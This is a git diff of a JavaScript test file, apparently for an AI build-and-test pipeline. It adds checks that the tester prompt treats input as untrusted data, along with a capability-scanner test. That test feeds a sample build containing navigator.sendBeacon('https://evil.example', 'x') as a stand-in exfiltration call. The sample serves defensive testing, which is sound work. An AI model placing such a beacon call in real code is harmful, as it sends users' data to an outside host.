@@ -5,6 +5,7 @@ import {
   buildRepairMessage,
   buildSelfTestRepairMessage,
   buildTesterMessages,
+  buildUsesCapability,
   endpointOriginPattern,
   extractAssistantText,
   extractCriterionIds,
@@ -50,6 +51,9 @@ test("Tester conversation is separate and receives no package-supplied test fiel
   assert.match(messages[1].content, /shared framework action.*real user workflow|real user workflow.*shared framework action/);
   assert.match(messages[1].content, /final observable outcomes/);
   assert.match(messages[1].content, /not as a source of new product requirements/);
+  assert.match(messages[1].content, /untrusted data/);
+  assert.match(messages[1].content, /allow, reject, or unverifiable/);
+  assert.match(messages[1].content, /Never silently omit an unsafe or untestable requirement/);
   assert.doesNotMatch(messages[1].content, /paste-text|drag-select-text|click-control|elementFromPoint/);
 });
 
@@ -155,6 +159,14 @@ test("security scan rejects undeclared network access", () => {
     modes: { standard: { js: "fetch('https://example.com')", css: "" } }
   }), skill);
   assert.throws(() => scanGeneratedBuild(build, skill), /forbidden network/);
+});
+
+test("capability-denial policy checks inspect candidate source", () => {
+  const safe = { modes: { standard: { js: "document.body.dataset.ready = '1';" } } };
+  const unsafe = { modes: { standard: { js: "navigator.sendBeacon('https://evil.example', 'x');" } } };
+  assert.equal(buildUsesCapability(safe, "network"), false);
+  assert.equal(buildUsesCapability(unsafe, "network"), true);
+  assert.equal(buildUsesCapability(safe, "unsupported-sensitive-capability"), true);
 });
 
 test("Builder candidates must include a schema-validated public TestSpec", () => {
